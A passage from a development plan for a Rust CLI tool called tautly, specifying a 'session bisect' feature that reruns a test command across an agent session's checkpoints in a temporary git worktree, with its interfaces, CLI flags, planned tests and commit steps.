- [ ] **Step 5: Commit** `git commit -m "feat(cli): compare sessions and branches"`

### Task 53: Session bisect (execute after Task 52)

**Files:**
- Create: `crates/tautly-core/src/bisect.rs`, `crates/tautly-cli/src/cmd/bisect.rs`
- Test: `crates/tautly-core/tests/bisect.rs`, `crates/tautly-cli/tests/bisect.rs`

**Interfaces:**
- Consumes: `state_at`, `worktree::create` (Tasks 49, 50); the bash process-group and timeout handling (Tasks 10, 25); the policy deny rules (Task 3).
- Produces:
  - `struct BisectPlan { session: String, test: String, good: u32, bad: u32, candidates: Vec<u32> }`, built by `fn bisect::plan(reader: &SessionReader<SessionRecord>, test: &str, good: Option<u32>, bad: Option<u32>) -> Result<BisectPlan, BisectError>`. Candidates are exact step boundaries only.
  - `fn bisect::prepass(reader: &SessionReader<SessionRecord>, test: &str) -> Option<(u32, u32)>`, from logged runs of the identical normalized command with their exit codes and write generations.
  - `enum Verdict { Good, Bad, Skip }` (exit 0, any other code, exit 125 or a timeout).
  - `#[async_trait] trait TestRunner { async fn run(&self, dir: &Path, cmd: &str, timeout: Duration) -> Verdict; }`.
  - `async fn bisect::run(plan: &BisectPlan, sb: &dyn Sandbox, runner: &dyn TestRunner, timeout: Duration) -> Result<BisectOutcome, BisectError>`.
    - It reuses one worktree `<data home>/worktrees/<project-id>/bisect-<ulid>`, moved with `git checkout --detach` plus the overlay.
    - Ignored files are kept between runs.
    - The endpoints are verified first.
    - The worktree is removed at the end, also on error.
  - `struct BisectOutcome { first_bad: Option<u32>, turn: Option<u32>, calls: Vec<String /* tool: target */>, text_excerpt: String /* ≤ 300 chars */, runs: u32, skipped: Vec<u32> }`.
  - CLI: `tautly bisect <session> --test "<cmd>" [--good N] [--bad M] [--timeout 600] [--yes] [--json]`. It asks before running (it shows the command and the maximum number of runs), unless `--yes` is given. A deny rule on the command refuses. An endpoint mismatch exits 2.

- [ ] **Step 1: Write the failing tests:**
  - `bisect_finds_first_failing_step` (an edit at step 3 breaks `./check.sh`);
  - `bisect_covers_bash_side_effects` (the bug comes from `sed -i` at step 5);
  - `partial_boundaries_skipped`;
  - `exit_125_and_timeout_skip`;
  - `endpoint_mismatch_exits_2`;
  - `prepass_narrows_range_with_fewer_runs`;
  - `runs_in_temp_worktree_original_untouched`;
  - `asks_unless_yes`;
  - `deny_rule_refuses`;
  - `worktree_removed_on_success_and_error`.
- [ ] **Step 2: Run** `cargo test -p tautly-core --test bisect && cargo test -p tautly --test bisect` — Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(cli): session bisect over checkpoints"`
